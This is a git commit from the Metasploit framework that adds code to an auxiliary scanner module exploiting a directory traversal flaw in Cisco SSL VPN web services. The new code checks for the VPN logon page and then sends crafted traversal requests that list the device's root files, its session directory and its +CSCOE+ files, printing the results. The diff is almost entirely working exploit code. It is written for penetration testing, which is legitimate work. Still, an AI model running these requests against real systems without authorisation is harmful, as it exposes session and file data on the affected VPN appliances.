ca8a01d27c47ba3b6cda3d28153aa540f6b71a9c
Shelby Pace <shelby_pace@rapid7.com>
2018-07-30 16:25:45 -0500

    getting filenames in http responses

--- modules/auxiliary/scanner/http/cisco_directory_traversal.rb
+++ modules/auxiliary/scanner/http/cisco_directory_traversal.rb
@@ -24,9 +24,59 @@ class MetasploitModule < Msf::Auxiliary
                           ],
       'DisclosureDate' => 'Jun 6 2018'
     ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, 'Path to Cisco installation', '/' ]),
+        OptBool.new('SSL', [ true, 'Use SSL', true ]),
+        Opt::RPORT(8080)
+      ])
+  end
+
+  def is_accessible?
+    uri = normalize_uri(target_uri.path, '+CSCOE+/logon.html')
+
+    res = send_request_cgi(
+      'method'  =>  'GET',
+      'uri'     =>  uri
+    )
+
+    return (res && res.body.include?("SSL VPN Service"))
+  end
+
+  def get_files
+    file_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/')
+    sessions_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/')
+    cscoe_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b')
+
+    file_res = send_request_cgi(
+      'method'  =>  'GET',
+      'uri'     =>  file_uri
+    )
+
+    sessions_res = send_request_cgi(
+      'method'  =>  'GET',
+      'uri'     =>  sessions_uri
+    )
+
+    cscoe_res = send_request_cgi(
+      'method'  =>  'GET',
+      'uri'     =>  cscoe_uri
+    )
+
+    if file_res && sessions_res && cscoe_res
+      print_good(file_res.body)
+      print_good(sessions_res.body)
+      print_good(cscoe_res.body)
+    end
   end
 
   def run
+    unless is_accessible?
+      fail_with(Failure::NotFound, 'Failed to reach Cisco web logon service')
+    end
+
+    get_files
   end
 
 end
